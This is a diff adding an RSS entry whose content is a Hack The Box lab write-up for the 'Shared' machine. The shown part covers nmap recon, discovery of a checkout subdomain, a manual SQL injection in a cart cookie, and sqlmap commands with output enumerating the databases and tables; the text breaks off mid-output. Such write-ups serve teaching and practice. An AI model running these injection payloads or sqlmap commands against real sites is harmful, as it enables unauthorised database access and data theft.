@@ -5,8 +5,523 @@
         <description>Recent content in Posts on MØst Xeon</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Thu, 03 Nov 2022 14:54:40 +0200</lastBuildDate>
+        <lastBuildDate>Fri, 11 Nov 2022 21:01:23 +0200</lastBuildDate>
         <atom:link href="https://mostxeon.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Shared</title>
+            <link>https://mostxeon.github.io/posts/shared/</link>
+            <pubDate>Fri, 11 Nov 2022 21:01:23 +0200</pubDate>
+            
+            <guid>https://mostxeon.github.io/posts/shared/</guid>
+            <description>false</description>
+            <content type="html"><![CDATA[<h2 id="initial-recon">Initial Recon</h2>
+<h3 id="nmap">Nmap</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p- -A 10.10.11.172
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-11-12 17:03 EET
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> shared.htb <span style="color:#f92672">(</span>10.10.11.172<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.12s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65423</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>, <span style="color:#ae81ff">109</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE  VERSION
+</span></span><span style="display:flex;"><span>22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 91e835f4695fc2e20e2746e2a6b6d865 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> cffcc45d84fb580bbe2dad35409dc351 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> a3386d750964ed70cf17499adc126d11 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp  open  http     nginx 1.18.0
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0
+</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">81</span> disallowed entries <span style="color:#f92672">(</span><span style="color:#ae81ff">15</span> shown<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| /*?order<span style="color:#f92672">=</span> /*?tag<span style="color:#f92672">=</span> /*?id_currency<span style="color:#f92672">=</span> /*?search_query<span style="color:#f92672">=</span> 
+</span></span><span style="display:flex;"><span>| /*?back<span style="color:#f92672">=</span> /*?n<span style="color:#f92672">=</span> /*&amp;order<span style="color:#f92672">=</span> /*&amp;tag<span style="color:#f92672">=</span> /*&amp;id_currency<span style="color:#f92672">=</span> 
+</span></span><span style="display:flex;"><span>| /*&amp;search_query<span style="color:#f92672">=</span> /*&amp;back<span style="color:#f92672">=</span> /*&amp;n<span style="color:#f92672">=</span> /*controller<span style="color:#f92672">=</span>addresses 
+</span></span><span style="display:flex;"><span>|_/*controller<span style="color:#f92672">=</span>address /*controller<span style="color:#f92672">=</span>authentication
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to https://shared.htb/
+</span></span><span style="display:flex;"><span>443/tcp open  ssl/http nginx 1.18.0
+</span></span><span style="display:flex;"><span>| tls-nextprotoneg: 
+</span></span><span style="display:flex;"><span>|   h2
+</span></span><span style="display:flex;"><span>|_  http/1.1
+</span></span><span style="display:flex;"><span>| tls-alpn: 
+</span></span><span style="display:flex;"><span>|   h2
+</span></span><span style="display:flex;"><span>|_  http/1.1
+</span></span><span style="display:flex;"><span>|_http-trane-info: Problem with XML parsing of /evox/about
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>*.shared.htb/organizationName<span style="color:#f92672">=</span>HTB/stateOrProvinceName<span style="color:#f92672">=</span>None/countryName<span style="color:#f92672">=</span>US
+</span></span><span style="display:flex;"><span>| Not valid before: 2022-03-20T13:37:14
+</span></span><span style="display:flex;"><span>|_Not valid after:  2042-03-15T13:37:14
+</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">81</span> disallowed entries <span style="color:#f92672">(</span><span style="color:#ae81ff">15</span> shown<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| /*?order<span style="color:#f92672">=</span> /*?tag<span style="color:#f92672">=</span> /*?id_currency<span style="color:#f92672">=</span> /*?search_query<span style="color:#f92672">=</span> 
+</span></span><span style="display:flex;"><span>| /*?back<span style="color:#f92672">=</span> /*?n<span style="color:#f92672">=</span> /*&amp;order<span style="color:#f92672">=</span> /*&amp;tag<span style="color:#f92672">=</span> /*&amp;id_currency<span style="color:#f92672">=</span> 
+</span></span><span style="display:flex;"><span>| /*&amp;search_query<span style="color:#f92672">=</span> /*&amp;back<span style="color:#f92672">=</span> /*&amp;n<span style="color:#f92672">=</span> /*controller<span style="color:#f92672">=</span>addresses 
+</span></span><span style="display:flex;"><span>|_/*controller<span style="color:#f92672">=</span>address /*controller<span style="color:#f92672">=</span>authentication
+</span></span><span style="display:flex;"><span>| http-title: Shared Shop
+</span></span><span style="display:flex;"><span>|_Requested resource was https://shared.htb/index.php
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 620.08 seconds
+</span></span></code></pre></div><h2 id="surfing-webpage">Surfing WebPage</h2>
+<p>When I tried to access the page on port <em>80</em>, I got redirected to <em><a href="https://shared.htb/">https://shared.htb/</a></em>, so I&rsquo;ll add this host to my <em>/etc/hosts</em> file.</p>
+<p><code>sudo echo -e '10.10.11.172\tshared.htb' &gt;&gt; /etc/hosts</code></p>
+<p>Now I am able to surf the page:</p>
+<p><img src="index_page_ssl.png" alt="Index Page"></p>
+<p>However this the secure version of the page on port <em>443</em> (https), so I tried to access the one without <em>SSL</em> on port <em>80</em> but I got redirected to the <em>SSL</em> version.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl http://shared.htb/index.php -v
+</span></span><span style="display:flex;"><span>*   Trying 10.10.11.172:80...
+</span></span><span style="display:flex;"><span>* Connected to shared.htb <span style="color:#f92672">(</span>10.10.11.172<span style="color:#f92672">)</span> port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span><span style="color:#75715e">#0)</span>
+</span></span><span style="display:flex;"><span>&gt; GET /index.php HTTP/1.1
+</span></span><span style="display:flex;"><span>&gt; Host: shared.htb
+</span></span><span style="display:flex;"><span>&gt; User-Agent: curl/7.85.0
+</span></span><span style="display:flex;"><span>&gt; Accept: */*
+</span></span><span style="display:flex;"><span>&gt; 
+</span></span><span style="display:flex;"><span>* Mark bundle as not supporting multiuse
+</span></span><span style="display:flex;"><span>&lt; HTTP/1.1 <span style="color:#ae81ff">301</span> Moved Permanently
+</span></span><span style="display:flex;"><span>&lt; Server: nginx/1.18.0
+</span></span><span style="display:flex;"><span>&lt; Date: Fri, <span style="color:#ae81ff">11</span> Nov <span style="color:#ae81ff">2022</span> 19:09:59 GMT
+</span></span><span style="display:flex;"><span>&lt; Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>&lt; Transfer-Encoding: chunked
+</span></span><span style="display:flex;"><span>&lt; Connection: keep-alive
+</span></span><span style="display:flex;"><span>&lt; Cache-Control: no-cache
+</span></span><span style="display:flex;"><span>&lt; Location: https://shared.htb/index.php
+</span></span><span style="display:flex;"><span>&lt; 
+</span></span><span style="display:flex;"><span>* Connection <span style="color:#75715e">#0 to host shared.htb left intact</span>
+</span></span></code></pre></div><p>It looks like this site is a shopping site having many products, and after clicking on one of them, I can that I can add it to cart:</p>
+<p><img src="products.png" alt="Products"></p>
+<p>Once I added the product to cart, a popup appeared asking me if I want to proceed to checkout:</p>
+<p><img src="add_to_cart.png" alt="Added To Cart"></p>
+<h3 id="discovering-new-domain">Discovering New Domain</h3>
+<p>After clicking on the <em>proceed</em> button, the site displayed the cart for me having another <em>PROCEED TO CHECKOUT</em> button:</p>
+<p><img src="proceed_to_checkout.png" alt="Proceed To Checkout"></p>
+<p><img src="new_domain.png" alt="New Domain"></p>
+<p>I got redirect to a new subdomain <em>checkout.shared.htb</em> when I click it, so I&rsquo;ll add it to <em>/etc/hosts</em>.</p>
+<p><code>sudo echo -e '10.10.11.172\tcheckout.shared.htb' &gt;&gt; /etc/hosts</code></p>
+<p><img src="checkout_page.png" alt="Chechout Page"></p>
+<p>Looks like my product is present in this page and I can proceed and pay for it. Without submitting any information, I tried to click the <em>pay</em> button to see what will happen, and I got a <em>payment successfull</em> message:</p>
+<p><img src="paying.png" alt="Paying"></p>
+<p>Since my product from the other domain is displayed here, the only way I could think that this is possible is using some sort of cookies shared between these domains. So, I&rsquo;ll open <code>burpsuite</code> to see what&rsquo;s happening behind the scene.</p>
+<p>By refreshing the page and intercepting the request, I got this:</p>
+<p><img src="seeing_cookie.png" alt="Intercepting Rquest"></p>
+<p>It appears that I was right, and there is a cookie that holds my cart products information: <em>custom_cart={&ldquo;YCS98E4A&rdquo;:&ldquo;1&rdquo;}</em></p>
+<p>I&rsquo;ll try to play with this cookie a little bit, so I&rsquo;ll change the key from <em>YCS98E4A</em> to <em>ThisDoesNotExist</em> and forward the request:</p>
+<p><img src="does_not_exist_cookie_key.png" alt="This Does Not Exist Key"></p>
+<p><img src="not_found_checkout.png" alt="Not Found Checkout"></p>
+<h3 id="discovering-sql-injection">Discovering SQL Injection</h3>
+<p>Looks like there is no errors but the product value changed to <em>Not Found</em>. I&rsquo;ll try now to <em>fuzz</em> this cookie to see maybe it is vulnerable to some type of <em>Injection</em>:</p>
+<p>First, I&rsquo;ll look for <em>SQL Injection</em>, so I&rsquo;ll send a simple <em>&rsquo; or &lsquo;1&rsquo;=&lsquo;1</em> payload in place of <em>YCS98E4A</em> in the cookie, so it becomes: <em>custom_cart={&quot;&rsquo; or &lsquo;1&rsquo;=&lsquo;1&quot;:&ldquo;1&rdquo;}</em></p>
+<p><img src="trying_simple_sqli.png" alt="Trying SQL Injection"></p>
+<p><img src="sqli_worked.png" alt="SQL Injection Worked"></p>
+<h3 id="dumping-databse">Dumping Databse</h3>
+<p>And it worked, which means that I can now dump the database using <code>sqlmap</code>:</p>
+<p><code>sqlmap -u 'http://checkout.shared.htb' --cookie='custom_cart={&quot;7DA8SKYP *&quot;:&quot;This is testing !!&quot;}' --level 5 --risk 3 --technique=B --batch</code></p>
+<ul>
+<li><em>technique=B</em> means that I will use <em>Boolean Based SQL Injection</em> to test the vulnerability and dump data, and I know that from the payload I previously used.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sqlmap -u <span style="color:#e6db74">&#39;http://checkout.shared.htb&#39;</span> --cookie<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;custom_cart={&#34;7DA8SKYP *&#34;:&#34;This is testing !!&#34;}&#39;</span> --level <span style="color:#ae81ff">5</span> --risk <span style="color:#ae81ff">3</span> --technique<span style="color:#f92672">=</span>B --batch
+</span></span><span style="display:flex;"><span>        ___
+</span></span><span style="display:flex;"><span>       __H__
+</span></span><span style="display:flex;"><span> ___ ___<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;]_____ ___ ___  {1.6.9#stable}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_ -| . [.]     | .&#39;| . |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|___|_  [,]_|_|_|__,|  _|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      |_|V...       |_|   https://sqlmap.org
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] starting @ 22:24:37 /2022-11-11/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">custom injection marker (&#39;*&#39;) found in option &#39;--headers/--user-agent/--referer/--cookie&#39;. Do you want to process it? [Y/n/q] Y
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:24:37] [INFO] flushing session file
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:24:37] [INFO] testing connection to the target URL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:24:39] [INFO] checking if the target is protected by some kind of WAF/IPS
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:24:40] [INFO] testing if the target URL content is stable
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:24:40] [INFO] target URL content is stable
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:24:40] [INFO] testing if (custom) HEADER parameter &#39;Cookie #1*&#39; is dynamic
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">do you want to URL encode cookie values (implementation specific)? [Y/n] Y
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:24:41] [INFO] (custom) HEADER parameter &#39;Cookie #1*&#39; appears to be dynamic
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:24:41] [WARNING] heuristic (basic) test shows that (custom) HEADER parameter &#39;Cookie #1*&#39; might not be injectable
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:24:41] [INFO] testing for SQL injection on (custom) HEADER parameter &#39;Cookie #1*&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:24:41] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:24:45] [INFO] (custom) HEADER parameter &#39;Cookie #1*&#39; appears to be &#39;AND boolean-based blind - WHERE or HAVING clause&#39; injectable (with --string=&#34;</span>This is testing !!<span style="color:#e6db74">&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:24:54] [INFO] heuristic (extended) test shows that the back-end DBMS could be &#39;MySQL&#39; 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">it looks like the back-end DBMS is &#39;MySQL&#39;. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:24:54] [INFO] checking if the injection point on (custom) HEADER parameter &#39;Cookie #1*&#39; is a false positive
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">(custom) HEADER parameter &#39;Cookie #1*&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">sqlmap identified the following injection point(s) with a total of 54 HTTP(s) requests:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Parameter: Cookie #1* ((custom) HEADER)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Type: boolean-based blind
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Title: AND boolean-based blind - WHERE or HAVING clause
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Payload: custom_cart={&#34;</span>7DA8SKYP <span style="color:#e6db74">&#39; AND 7963=7963-- BefO&#34;:&#34;This is testing !!&#34;}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:25:04] [INFO] testing MySQL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:25:04] [INFO] confirming MySQL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:25:05] [INFO] the back-end DBMS is MySQL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">web application technology: Nginx 1.18.0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">back-end DBMS: MySQL &gt;= 5.0.0 (MariaDB fork)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:25:05] [INFO] fetched data logged to text files under &#39;</span>/home/kali/.local/share/sqlmap/output/checkout.shared.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ending @ 22:25:05 /2022-11-11/
+</span></span></code></pre></div><p>The database appears to be <em>MySQL MariaDB</em>. Now I will dump the databases:</p>
+<ul>
+<li>
+<p>To get the existing <em>databases</em>: <code>sqlmap -u 'http://checkout.shared.htb' --cookie='custom_cart={&quot;7DA8SKYP *&quot;:&quot;This is testing !!&quot;}' --level 5 --risk 3 --technique=B --batch --dbms=mysql --dbs</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sqlmap -u <span style="color:#e6db74">&#39;http://checkout.shared.htb&#39;</span> --cookie<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;custom_cart={&#34;7DA8SKYP *&#34;:&#34;This is testing !!&#34;}&#39;</span> --level <span style="color:#ae81ff">5</span> --risk <span style="color:#ae81ff">3</span> --technique<span style="color:#f92672">=</span>B --batch --dbms<span style="color:#f92672">=</span>mysql --dbs
+</span></span><span style="display:flex;"><span>        ___
+</span></span><span style="display:flex;"><span>      __H__
+</span></span><span style="display:flex;"><span>___ ___<span style="color:#f92672">[</span>,<span style="color:#f92672">]</span>_____ ___ ___  <span style="color:#f92672">{</span>1.6.9#stable<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>|_ -| . <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;]     | .&#39;| . |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|___|_  [,]_|_|_|__,|  _|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      |_|V...       |_|   https://sqlmap.org
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] starting @ 22:36:35 /2022-11-11/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">custom injection marker (&#39;*&#39;) found in option &#39;--headers/--user-agent/--referer/--cookie&#39;. Do you want to process it? [Y/n/q] Y
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:36:35] [INFO] testing connection to the target URL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">sqlmap resumed the following injection point(s) from stored session:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Parameter: Cookie #1* ((custom) HEADER)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Type: boolean-based blind
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Title: AND boolean-based blind - WHERE or HAVING clause
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Payload: custom_cart={&#34;</span>7DA8SKYP <span style="color:#e6db74">&#39; AND 8525=8525-- fdrV&#34;:&#34;This is testing !!&#34;}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:36:36] [INFO] testing MySQL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:36:36] [INFO] confirming MySQL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:36:36] [INFO] the back-end DBMS is MySQL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">web application technology: Nginx 1.18.0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">back-end DBMS: MySQL &gt;= 5.0.0 (MariaDB fork)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:36:36] [INFO] fetching database names
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:36:36] [INFO] fetching number of databases
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:36:36] [WARNING] running in a single-thread mode. Please consider usage of option &#39;</span>--threads<span style="color:#e6db74">&#39; for faster data retrieval
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:36:36] [INFO] retrieved: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">do you want to URL encode cookie values (implementation specific)? [Y/n] Y
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:36:38] [INFO] retrieved: information_schema
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:37:02] [INFO] retrieved: checkout
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">available databases [2]:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] checkout
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] information_schema
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:37:14] [INFO] fetched data logged to text files under &#39;</span>/home/kali/.local/share/sqlmap/output/checkout.shared.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ending @ 22:37:14 /2022-11-11/
+</span></span></code></pre></div></li>
+<li>
+<p>To enumerate <em>tables</em> from <em>checkout</em> database: <code>sqlmap -u 'http://checkout.shared.htb' --cookie='custom_cart={&quot;7DA8SKYP *&quot;:&quot;This is testing !!&quot;}' --level 5 --risk 3 --technique=B --batch --dbms=mysql -D checkout --tables</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sqlmap -u <span style="color:#e6db74">&#39;http://checkout.shared.htb&#39;</span> --cookie<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;custom_cart={&#34;7DA8SKYP *&#34;:&#34;This is testing !!&#34;}&#39;</span> --level <span style="color:#ae81ff">5</span> --risk <span style="color:#ae81ff">3</span> --technique<span style="color:#f92672">=</span>B --batch --dbms<span style="color:#f92672">=</span>mysql -D checkout --tables
+</span></span><span style="display:flex;"><span>        ___
+</span></span><span style="display:flex;"><span>      __H__
+</span></span><span style="display:flex;"><span>___ ___<span style="color:#f92672">[</span>.<span style="color:#f92672">]</span>_____ ___ ___  <span style="color:#f92672">{</span>1.6.9#stable<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>|_ -| . <span style="color:#f92672">[(]</span>     | .<span style="color:#e6db74">&#39;| . |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|___|_  [,]_|_|_|__,|  _|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      |_|V...       |_|   https://sqlmap.org
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span style="color:#66d9ef">for</span> any misuse or damage caused by this program
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> starting @ 22:40:03 /2022-11-11/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>custom injection marker <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;*&#39;</span><span style="color:#f92672">)</span> found in option <span style="color:#e6db74">&#39;--headers/--user-agent/--referer/--cookie&#39;</span>. Do you want to process it? <span style="color:#f92672">[</span>Y/n/q<span style="color:#f92672">]</span> Y
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22:40:03<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing connection to the target URL
+</span></span><span style="display:flex;"><span>sqlmap resumed the following injection point<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> from stored session:
+</span></span><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span>Parameter: Cookie <span style="color:#75715e">#1* ((custom) HEADER)</span>
+</span></span><span style="display:flex;"><span>    Type: boolean-based blind
+</span></span><span style="display:flex;"><span>    Title: AND boolean-based blind - WHERE or HAVING clause
+</span></span><span style="display:flex;"><span>    Payload: custom_cart<span style="color:#f92672">={</span><span style="color:#e6db74">&#34;7DA8SKYP &#39; AND 8525=8525-- fdrV&#34;</span>:<span style="color:#e6db74">&#34;This is testing !!&#34;</span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22:40:03<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing MySQL
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22:40:03<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> confirming MySQL
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22:40:03<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> the back-end DBMS is MySQL
+</span></span><span style="display:flex;"><span>web application technology: Nginx 1.18.0
+</span></span><span style="display:flex;"><span>back-end DBMS: MySQL &gt;<span style="color:#f92672">=</span> 5.0.0 <span style="color:#f92672">(</span>MariaDB fork<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22:40:03<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> fetching tables <span style="color:#66d9ef">for</span> database: <span style="color:#e6db74">&#39;checkout&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22:40:03<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> fetching number of tables <span style="color:#66d9ef">for</span> database <span style="color:#e6db74">&#39;checkout&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22:40:03<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> running in a single-thread mode. Please consider usage of option <span style="color:#e6db74">&#39;--threads&#39;</span> <span style="color:#66d9ef">for</span> faster data retrieval
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22:40:03<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieved: 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span> you want to URL encode cookie values <span style="color:#f92672">(</span>implementation specific<span style="color:#f92672">)</span>? <span style="color:#f92672">[</span>Y/n<span style="color:#f92672">]</span> Y
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22:40:04<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieved: user
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22:40:10<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieved: product
+</span></span><span style="display:flex;"><span>Database: checkout
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#ae81ff">2</span> tables<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>+---------+
+</span></span><span style="display:flex;"><span>| user    |
+</span></span><span style="display:flex;"><span>| product |
+</span></span><span style="display:flex;"><span>+---------+
+</span></span><span style="display:flex;"><span>
